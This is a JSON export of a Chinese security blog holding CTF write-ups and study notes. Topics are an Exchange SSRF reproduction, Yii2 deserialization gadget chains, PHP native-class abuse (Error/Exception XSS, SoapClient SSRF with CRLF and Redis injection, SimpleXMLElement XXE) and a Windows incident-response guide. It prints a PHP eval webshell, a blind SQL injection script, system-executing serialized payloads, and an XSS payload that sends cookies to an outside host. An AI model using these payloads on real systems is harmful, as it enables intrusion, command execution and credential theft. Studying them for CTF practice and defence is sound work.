{"meta":{"title":"ye1s","subtitle":"","description":"","author":"ye1s","url":"https://blog.cfyqy.com","root":"/"},"pages":[{"title":"categories","date":"2020-06-23T03:20:26.000Z","updated":"2020-06-23T03:27:25.221Z","comments":true,"path":"categories/index.html","permalink":"https://blog.cfyqy.com/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-06-23T03:09:01.000Z","updated":"2020-09-18T01:13:32.568Z","comments":true,"path":"about/index.html","permalink":"https://blog.cfyqy.com/about/index.html","excerpt":"","text":"关于我 CTF划水 web渣渣 渗透菜鸟 开发小白 虽然菜得一撇，但仍热爱学习 关于博文 此博客只是博主个人学习笔记，很多文章知识都是从网上抄录而来，如有侵权，请联系eWUxc2VjQHFxLmNvbQ==,告知删除。"},{"title":"index","date":"2020-06-23T03:34:54.000Z","updated":"2020-06-23T03:35:15.005Z","comments":true,"path":"index/index.html","permalink":"https://blog.cfyqy.com/index/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-06-23T03:19:30.000Z","updated":"2020-06-23T03:25:36.558Z","comments":true,"path":"tags/index.html","permalink":"https://blog.cfyqy.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"ctfshow web 刷题","slug":"ctfshow-web-刷题","date":"2021-06-11T07:30:04.000Z","updated":"2021-06-11T08:26:50.871Z","comments":true,"path":"article/9c2cf38e.html","link":"","permalink":"https://blog.cfyqy.com/article/9c2cf38e.html","excerpt":"ctfshow web刷题","text":"ctfshow web刷题 web4在url添加一句话会被编码，在User-Agent中添加。 12345678GET / HTTP/1.1Host: 0962422f-8459-4372-8ed2-acebe03635c0.challenge.ctf.show:8080User-Agent: &lt;?php @eval($_POST[a]);?&gt; Firefox/88.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1 web5md5 12345QNKCDZO240610708s878926199as155964671as214587387a web6password字段存在注入，过滤了空格 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsimport timefrom functools import wrapsdef spend_time(func): @wraps(func) def wrapper(*agrs, **kwargs): startTime &#x3D; time.time() func(*agrs, **kwargs) endTime &#x3D; time.time() sumTime &#x3D; endTime - startTime print(&quot;spend time:&quot;, sumTime) return wrapperdef and_operation(): url &#x3D; &quot;http:&#x2F;&#x2F;dceb0f35-65a5-4f40-856e-ecdc2d487f30.challenge.ctf.show:8080&#x2F;&quot; flag_payload &#x3D; &quot;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;if((ascii(substr((select&#x2F;**&#x2F;flag&#x2F;**&#x2F;from&#x2F;**&#x2F;flag),&#123;0&#125;,1))&amp;&#123;1&#125;),sleep(2),1)&#x2F;**&#x2F;#&quot; info &#x3D; &quot;&quot; for j in range(1, 100): value &#x3D; 0 for k in range(7): payload &#x3D; flag_payload.format(j, 2 ** k) data &#x3D; &#123; &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: payload &#125; start_time&#x3D;time.time() res &#x3D; requests.post(url&#x3D;url, data&#x3D;data) end_time&#x3D;time.time() spend_time&#x3D;end_time-start_time if spend_time&gt;2: value &#x3D; value + (2 ** k) if value &#x3D;&#x3D; 0: break info &#x3D; info + chr(value) print(info)if __name__ &#x3D;&#x3D; &quot;__main__&quot;: and_operation()","categories":[],"tags":[],"author":"ye1s"},{"title":"Exchange CVE-2021-26855 漏洞复现","slug":"Exchange-CVE-2021-26855-漏洞复现","date":"2021-06-07T10:56:00.000Z","updated":"2021-06-09T00:58:18.695Z","comments":true,"path":"article/28b11aac.html","link":"","permalink":"https://blog.cfyqy.com/article/28b11aac.html","excerpt":"0x1 漏洞概述CVE-2021-26855 是Exchange中的服务端请求伪造漏洞（SSRF），利用此漏洞的攻击者能够发送任意HTTP请求并绕过Exchange Server身份验证，远程未授权的攻击者可以利用该漏洞以进行内网探测，并可以用于窃取用户邮箱的全部内容。","text":"0x1 漏洞概述CVE-2021-26855 是Exchange中的服务端请求伪造漏洞（SSRF），利用此漏洞的攻击者能够发送任意HTTP请求并绕过Exchange Server身份验证，远程未授权的攻击者可以利用该漏洞以进行内网探测，并可以用于窃取用户邮箱的全部内容。 0x2 影响版本Microsoft Exchange Server: 2010Microsoft Exchange Server: 2013Microsoft Exchange Server: 2016Microsoft Exchange Server: 2019 0x3 漏洞复现漏洞环境 window server 2016 Exchange Server 2016 CU19 安装教程可查参考文章：https://blog.csdn.net/zhaowei198311/article/details/107391577 0x3.1 SSRF访问url为：https://xx.xx.xx.xx/owa/auth/ye1s.js（ye1s.js可以随便构造）构造Cookie信息为：X-AnonResource=true; X-AnonResource-Backend=DNSLOUG地址/ecp/default.flt?~3 0x3.2 获取邮箱内容exp地址：https://github.com/charlottelatest/CVE-2021-26855 可猜测用户名，可列出邮件列表并下载正确用户名猜解 0x3.3 RCEexp地址:https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/master/Exchange/CVE-2021-26855 Exchange RCE/exp.py 0x4修复建议微软官方已针对该批漏洞发布相关安全更新补丁，可按照以下链接进行升级:https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855","categories":[],"tags":[],"author":"ye1s"},{"title":"YII漏洞学习","slug":"YII漏洞学习","date":"2021-05-27T16:48:41.000Z","updated":"2021-06-07T09:35:37.330Z","comments":true,"path":"article/509b0f7f.html","link":"","permalink":"https://blog.cfyqy.com/article/509b0f7f.html","excerpt":"yii学习","text":"yii学习 yii2CVE-2020-15148影响yii2的2.0.37版本或其他更低版本poc1-3 可看此文章https://juejin.cn/post/6874149010832097294 poc1（CVE-2020-15148）利用[(new test), &quot;aaa&quot;]来调用任意test类的aaa方法，绕过了call_user_func参数不可控。 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = 'system'; $this-&gt;id = 'ls'; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters['close'] = [new CreateAction(), 'run']; &#125; &#125;&#125;namespace yii\\db&#123; use Faker\\Generator; class BatchQueryResult&#123; private $_dataReader; public function __construct()&#123; $this-&gt;_dataReader = new Generator; &#125; &#125;&#125;namespace&#123; echo base64_encode(serialize(new yii\\db\\BatchQueryResult));&#125;?&gt; poc2123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = 'system'; $this-&gt;id = 'ls'; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; // 这里需要改为isRunning $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run']; &#125; &#125;&#125;// poc2namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $processes; public function __construct() &#123; $this-&gt;processes = [new Generator()]; &#125; &#125;&#125;namespace&#123; // 生成poc echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125;?&gt; poc312345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = 'system'; $this-&gt;id = 'ls'; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; // 这里需要改为isRunning $this-&gt;formatters['render'] = [new CreateAction(), 'run']; &#125; &#125;&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Faker\\Generator; class See&#123; protected $description; public function __construct() &#123; $this-&gt;description = new Generator(); &#125; &#125;&#125;namespace&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache&#123; private $keys = []; private $path; public function __construct() &#123; $this-&gt;path = new See; $this-&gt;keys = array( \"axin\"=&gt;array(\"is\"=&gt;\"handsome\") ); &#125; &#125; // 生成poc echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt; poc412345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?php namespace yii\\rest&#123; class IndexAction &#123; public $checkAccess; public $id; public function __construct() &#123; $this-&gt;checkAccess=\"system\"; $this-&gt;id=\"whoami\"; &#125; &#125; &#125; namespace yii\\web&#123; use yii\\rest\\IndexAction; class DbSession &#123; protected $fields = []; public $writeCallback; public function __construct() &#123; $this-&gt;writeCallback=[(new IndexAction),\"run\"]; $this-&gt;fields['1'] = 'aaa'; &#125; &#125; &#125; namespace yii\\db &#123; use yii\\web\\DbSession; class BatchQueryResult &#123; private $_dataReader; public function __construct() &#123; $this-&gt;_dataReader=new DbSession(); &#125; &#125; &#125; namespace &#123; $exp=print(base64_encode(serialize(new yii\\db\\BatchQueryResult()))); &#125;?&gt; other poc可看此文章https://www.anquanke.com/post/id/217929 新POP链yii2 version &lt;= 2.0.41(GitHub最新版本) https://xz.aliyun.com/t/9420 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace Faker&#123; class DefaultGenerator&#123; protected $default ; function __construct($argv) &#123; $this-&gt;default = $argv; &#125; &#125; class ValidGenerator&#123; protected $generator; protected $validator; protected $maxRetries; function __construct($command,$argv) &#123; $this-&gt;generator = new DefaultGenerator($argv); $this-&gt;validator = $command; $this-&gt;maxRetries = 99999999; &#125; &#125;&#125;namespace Codeception\\Extension&#123; use Faker\\ValidGenerator; class RunProcess&#123; private $processes = [] ; function __construct($command,$argv) &#123; $this-&gt;processes[] = new ValidGenerator($command,$argv); &#125; &#125;&#125;namespace &#123; use Codeception\\Extension\\RunProcess; $exp = new RunProcess('system','whoami'); echo(base64_encode(serialize($exp))); exit();&#125; YII2SQL注入分析影响版本： 小于v 2.0.15 https://juejin.cn/post/6874149010832097294https://www.anquanke.com/post/id/217929","categories":[],"tags":[]},{"title":"应急响应","slug":"应急响应","date":"2021-05-25T04:29:54.000Z","updated":"2021-05-25T09:53:50.154Z","comments":true,"path":"article/587e8742.html","link":"","permalink":"https://blog.cfyqy.com/article/587e8742.html","excerpt":"应急响应知识点","text":"应急响应知识点 window端口服务12netstat -anotasklist | findstr “PID” 进程查看进程（1）开始–运行–输入msinfo32，依次点击“软件环境→正在运行任务”就可以查看到进程的详细信息，比如进程路 径、进程ID、文件创建日期、启动时间等（2）使用Process Explorer 查看进程（3）D盾查看进程启动项分析使用Autoruns进行启动项分析 window日志window日志分为系统日志，应用程序日志和安全日志。在应急溯源中，重点关注安全日志 系统日志 12记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT&#x2F;2000操作系统预先定义。默认位置： %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx 应用程序日志 12包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx 安全日志 12记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx 按 “Window+R”，输入 ”eventvwr.msc“ 也可以直接进入“事件查看器” 对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明： 事件ID 说明 4624 登录成功 4625 登录失败 4634 注销成功 4647 用户启动的注销 4672 使用超级用户（如管理员）进行登录 4720 创建用户 每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式： 登录类型 描述 说明 2 交互式登录（Interactive） 用户在本地进行登录 3 网络（Network） 常见的情况就是连接到共享文件夹或共享打印机时，如SMB爆破——蠕虫病毒 4 批处理（Batch） 通常表明某计划任务启动 5 服务（Service） 每种服务都被配置在某个特定的用户账号下运行 7 解锁（Unlock） 屏保解锁。 8 网络明文（NetworkCleartext） 登录的密码在网络上是通过明文传输的，如FTP 9 新凭证（NewCredentials） 使用带/Netonly参数的RUNAS命令运行一个程序 10 远程交互（RemoteInteractive） 通过终端服务、远程桌面或远程协助访问计算机，如RDP爆破——勒索病毒 11 缓存交互（CachedInteractive） 以一个域用户登录而又没有域控制器可用 Log Parser 工具下载：https://www.microsoft.com/en-us/download/details.aspx?id=24659查询登录成功的所有事件 1LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4624\" 查询登录成功，切登录类型为10的用户名和IP 1LogParser.exe -i:EVT -o:datagrid \"SELECT TimeGenerated,EXTRACT_TOKEN(Strings,8,'|') AS LoginType,EXTRACT_TOKEN( Strings,5,'|') AS USERNAME,EXTRACT_TOKEN(Strings,17,'|') AS ProcessName,EXTRACT_TOKEN(Strings,18,'|') AS Client_IP FROM 'anquan.evtx' WHERE EventID='4624' AND EXTRACT_TOKEN(Strings,18,'|') NOT LIKE '%-%' AND ( EXTRACT_TOKEN(Strings,8,'|')='10' or EXTRACT_TOKEN(Strings,8,'|')='10') ORDER BY TimeGenerated DESC\" 提取登录成功的用户名和IP 1LogParser.exe -i:EVT -o:datagrid \"SELECT TimeGenerated,EXTRACT_TOKEN(Strings,8,'|') AS LoginType,EXTRACT_TOKEN( Strings,5,'|') AS USERNAME,EXTRACT_TOKEN(Strings,17,'|') AS ProcessName,EXTRACT_TOKEN(Strings,18,'|') AS Client_IP FROM 'anquan.evtx' WHERE EventID='4624' Event Log ExplorerEvent Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。 下载地址：https://event-log-explorer.en.softonic.com/ 参考文章： https://xz.aliyun.com/t/8253","categories":[],"tags":[],"author":"ye1s"},{"title":"PHP原生类利用","slug":"PHP原生类利用","date":"2021-05-11T15:15:45.000Z","updated":"2021-05-11T16:58:25.771Z","comments":true,"path":"article/511af9ea.html","link":"","permalink":"https://blog.cfyqy.com/article/511af9ea.html","excerpt":"php原生类利用 转载 https://www.anquanke.com/post/id/238482","text":"php原生类利用 转载 https://www.anquanke.com/post/id/238482 遍历一下PHP的内置类： 12345678910111213141516171819202122 &lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123; $methods = get_class_methods($class); foreach ($methods as $method) &#123; if (in_array($method, array( '__destruct', '__toString', '__wakeup', '__call', '__callStatic', '__get', '__set', '__isset', '__unset', '__invoke', '__set_state' // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类 ))) &#123; print $class . '::' . $method . \"\\n\"; &#125; &#125;&#125; 常遇到的几个 PHP 原生类有如下几个： 12345ErrorExceptionSoapClientDirectoryIteratorSimpleXMLElement 使用 Error/Exception 内置类进行 XSSError 内置类适用于php7版本在开启报错的情况下Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 __toString()的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 echo &lt;Object&gt;的写法，当 PHP 对象被当作一个字符串输出或使用时候（如echo的时候）会触发__toString 方法，这是一种挖洞的新思路。 下面演示如何使用 Error 内置类来构造 XSS。 测试代码： 1234&lt;?php$a = unserialize($_GET['test']);echo $a;?&gt; （这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化） 给出POC： 12345&lt;?php$a = new Error(\"&lt;script&gt;alert('xss')&lt;/script&gt;\");$b = serialize($a);echo urlencode($b); ?&gt; Exception 内置类适用于php5、7版本开启报错的情况下测试代码： 1234&lt;?php$a = unserialize($_GET['whoami']);echo $a;?&gt; 给出POC： 12345&lt;?php$a = new Exception(\"&lt;script&gt;alert('xss')&lt;/script&gt;\");$b = serialize($a);echo urlencode($b); ?&gt; [BJDCTF 2nd]xss之光进入题目，首先通过git泄露拿到源码： 123&lt;?php$a = $_GET['yds_is_so_beautiful'];echo unserialize($a); 仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。 由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下： 1234&lt;?php$poc = new Exception(\"&lt;script&gt;window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;\");echo urlencode(serialize($poc));?&gt; 得到payload如下： 1/?yds_is_so_beautiful=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D 执行后，得到flag就在 cookie 中 使用 SoapClient 类进行 SSRFSoapClient 类PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。 类摘要如下： 1234567891011121314151617SoapClient &#123; /* 方法 */ public __construct ( string|null $wsdl , array $options = [] ) public __call ( string $name , array $args ) : mixed public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null public __getCookies ( ) : array public __getFunctions ( ) : array|null public __getLastRequest ( ) : string|null public __getLastRequestHeaders ( ) : string|null public __getLastResponse ( ) : string|null public __getLastResponseHeaders ( ) : string|null public __getTypes ( ) : array|null public __setCookie ( string $name , string|null $value = null ) : void public __setLocation ( string $location = \"\" ) : string|null public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125; 可以看到，该内置类有一个 __call方法，当__call方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个__call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。 该类的构造函数如下： 1public SoapClient :: SoapClient(mixed $wsdl [，array $options ]) 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 使用 SoapClient 类进行 SSRF知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。 1234567&lt;?php$a = new SoapClient(null,array('location'=&gt;'http://xxx.xxx.xxx.xxx:3333/aaa', 'uri'=&gt;'http://xxx.xxx.xxx.xxx:3333'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt; 首先在xxx.xxx.xxx.xxx上面起个监听,然后执行上述代码，如下图所示成功触发SSRF，xxx.xxx.xxx.xxx上面收到了请求信息 但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。 如下测试代码，我们在HTTP头中插入一个cookie： 12345678&lt;?php$target = 'http://xxx.xxx.xxx.xxx:3333/';$a = new SoapClient(null,array('location' =&gt; $target, 'user_agent' =&gt; \"chrome\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\", 'uri' =&gt; 'test'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt; 执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie： 攻击redis 12345678910&lt;?php$target = 'http://127.0.0.1:3333/';$poc = \"CONFIG SET dir /var/www/html\";$a = new SoapClient(null,array('location' =&gt; $target, 'uri' =&gt; 'hello^^'.$poc.'^^hello'));$b = serialize($a);$b = str_replace('^^',\"\\n\\r\",$b);echo $b;$c = unserialize($b);$c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt; 执行代码后，如下图所示，成功插入了Redis命令： 对于如何发送POST的数据包，这里面还有一个坑，就是 Content-Type 的设置，因为我们要提交的是POST数据，所以 Content-Type 的值我们要设置为 application/x-www-form-urlencoded，这里如何修改 Content-Type 的值呢？由于 Content-Type 在 User-Agent 的下面，所以我们可以通过 SoapClient 来设置 User-Agent ，将原来的 Content-Type 挤下去，从而再插入一个新的 Content-Type 。 测试代码如下： 1234567891011121314&lt;?php$target = 'http://xxx.xxx.xxx.xxx:2333/';$post_data = 'data=whoami';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93');$a = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'chrome^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=&gt;'test'));$b = serialize($a);$b = str_replace('^^',\"\\n\\r\",$b);echo $b;$c = unserialize($b);$c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt; 执行代码后，如下图所示，成功发送POST数据： bastphp’s revengeindex.php 123456789101112&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'], $_POST);session_start();if (isset($_GET['name'])) &#123; $_SESSION['name'] = $_GET['name'];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');call_user_func($b, $a);?&gt; flag.php 1234567session_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;*************************&#125;';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\")&#123; $_SESSION['flag'] = $flag; &#125;only localhost can get flag! 可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。 但是这里并没有明显的ssrf利用点，所以我们想到利用PHP原生类SoapClient触发反序列化导致SSRF。并且，由于flag会被插入到session中，所以我们就一定需要携带一个cookie即PHPSESSID去访问它来生成这个session文件。 写出最后的POC： 1234567&lt;?php$target = \"http://127.0.0.1/flag.php\";$attack = new SoapClient(null,array('location' =&gt; $target, 'user_agent' =&gt; \"chrome\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\\r\\n\", 'uri' =&gt; \"123\"));$payload = urlencode(serialize($attack));echo $payload; 这里这个POC就是利用CRLF伪造本地请求SSRF去访问flag.php，并将得到的flag结果保存在cookie为 PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4 的session中。 然后，我们就要想办法反序列化这个对象，但这里有没有反序列化点，那么我们怎么办呢？我们在题目源码中发现了session_start();，很明显，我们可以用session反序列化漏洞。但是如果想要利用session反序列化漏洞的话，我们必须要有 ini_set() 这个函数来更改 session.serialize_handler 的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用session_start()函数来代替，即构造 session_start(serialize_handler=php_serialize) 就行了。我们可以利用题目中的 call_user_func($_GET[&#39;f&#39;], $_POST);函数，传入GET：/?f=session_start、POST：serialize_handler=php_serialize，实现 session_start(serialize_handler=php_serialize) 的调用来修改此页面的序列化引擎为php_serialize。 所以，我们第一次传值先注入上面POC生成的payload创建并得到我们的session： 此时，我们成功将我们php原生类SoapClient构造的payload传入了 PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4 的session中，当页面重新加载时，就会自动将其反序列化。但此时还不会触发SSRF，需要触发__call方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码： 12$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');call_user_func($b, $a); 我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了： 1call_user_func(call_user_func, array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;)); call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。 这样也就是会访问我们构造的session对象中的welcome_to_the_lctf2018方法，而welcome_to_the_lctf2018方法不存在，就会触发 __call方法，造成ssrf去访问flag.php。 所以我们第二次传参如下：最后，我们第三次传参，用我们POC里面自己设置的cookie（PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4）去访问这个页面，var_dump($_SESSION); 会将 PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4 的这个session内容输出出来，即可得到flag： 例题bestphp’s revengeindex.php 123456789101112&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'], $_POST);session_start();if (isset($_GET['name'])) &#123; $_SESSION['name'] = $_GET['name'];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');call_user_func($b, $a);?&gt; flag.php 1234567session_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;*************************&#125;';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\")&#123; $_SESSION['flag'] = $flag; &#125;only localhost can get flag! 可见当REMOTE_ADDR等于127.0.0.1时，就会在session中插入flag，就能得到flag。很明显了，要利用ssrf。首先构造出session反序列化的条件:利用call_user_func()调用session_start()设置serialize_handler为php_serialize。因为题目源码中没有可以利用的构造pop链的类，而刚好SOAP的SoapClient类可以用来创建soap数据报文，与wsdl接口进行交互的，达到ssrf的效果。 1payload = '|O:10:\"SoapClient\":3:&#123;s:3:\"uri\";s:3:\"123\";s:8:\"location\";s:25:\"http://127.0.0.1/flag.php\";s:13:\"_soap_version\";i:1;&#125;' 最后需要再利用第二个call_user_func激活soap类，具体实施是通过变量覆盖利用extract将$b为call_user_func，调用$a中对象，从而触发soap的网络请求。这里数组a中$_SESSION里的数据是soap对象，再经过reset()弹出这个对象成为了$a[0]。 12$_GET = array('f'=&gt;'extract');$_POST = array('b'=&gt;'call_user_func'); exp 12345678910111213141516171819202122232425import requestsimport reurl = \"http://27fd9428-ccac-4c07-b6a7-8367586baea1.node3.buuoj.cn/\"payload = '|O:10:\"SoapClient\":3:&#123;s:3:\"uri\";s:3:\"123\";s:8:\"location\";s:25:\"http://127.0.0.1/flag.php\";s:13:\"_soap_version\";i:1;&#125;'r = requests.session()data = &#123;'serialize_handler' : 'php_serialize'&#125;url1 = url+\"?f=session_start&amp;name=\"+payloadhtml = r.post(url1, data=data).textdata = &#123;'b' : \"call_user_func\"&#125;url2 = url+\"?f=extract&amp;name=\"+payloadhtml = r.post(url2, data=data).textdata = &#123;'b' : \"var_dump\"&#125;url2 = url+\"?f=extract&amp;name=\"+payloadhtml = r.post(url2, data=data).textrs = re.findall(r'string\\(26\\) \"(.*?)\"', html)url2 = urlcookie = &#123;\"Cookie\":\"PHPSESSID=\"+rs[0]&#125;html = r.post(url2,headers = cookie).textprint html 使用 SimpleXMLElement 类进行 XXESimpleXMLElement 这个内置类用于解析 XML 文档中的元素。 SimpleXMLElement 类官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下： 可以看到通过设置第三个参数 data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。 这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。 [SUCTF 2018]Homework进入题目，随便注册一个账号，登录作业平台。看到一个 calc 计算器类的代码。有两个按钮，一个用于调用 calc 类实现两位数的四则运算。另一个用于上传文件，提交代码。 calc计算机类代码为： 1234567891011121314151617181920212223242526272829303132333435&lt;?php class calc&#123; function __construct__()&#123; calc(); &#125; function calc($args1,$method,$args2)&#123; $args1=intval($args1); $args2=intval($args2); switch ($method) &#123; case 'a': $method=\"+\"; break; case 'b': $method=\"-\"; break; case 'c': $method=\"*\"; break; case 'd': $method=\"/\"; break; default: die(\"invalid input\"); &#125; $Expression=$args1.$method.$args2; eval(\"\\$r=$Expression;\"); die(\"Calculation results:\".$r); &#125;&#125;?&gt; 所以我们可以通过这种形式调用PHP中的内置类。这里我们通过调用 SimpleXMLElement 这个内置类来构造 XXE。 首先，我们在vps（xxx.xxx.xxx.xxx）上构造如下evil.xml、send.xml和send.php这三个文件。 构造的xml如下 obj.xml 1234567&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM \"http://174.0.159.143/e.xml\"&gt;%int;%all;%send;]&gt; e.xml 12&lt;!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\"&gt;&lt;!ENTITY % 